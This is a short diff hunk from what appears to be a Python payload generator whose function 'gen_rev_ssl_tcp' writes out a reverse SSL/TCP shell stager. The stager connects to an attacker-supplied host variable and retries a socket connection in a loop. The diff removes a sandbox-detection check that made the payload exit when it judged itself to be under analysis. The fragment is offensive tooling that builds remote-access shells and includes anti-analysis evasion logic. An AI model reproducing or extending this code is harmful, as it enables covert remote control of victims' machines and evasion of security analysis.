@@ -360,13 +360,10 @@ def gen_rev_ssl_tcp():
         ina.write("\n")
         ina.write('hototo = "'+str(host)+'"')
         b = '''
-from sandboxed import is_sandboxed
-import zlib,base64,ssl,socket,struct,time
-import sys
 
-certainty = is_sandboxed(logging=False)
-if int(certainty*100) > 50:
-    sys.exit(1)
+import zlib,base64,ssl,socket,struct,time
+
+
 for x in range(10):
 	try:
 		so=socket.socket(2,1)
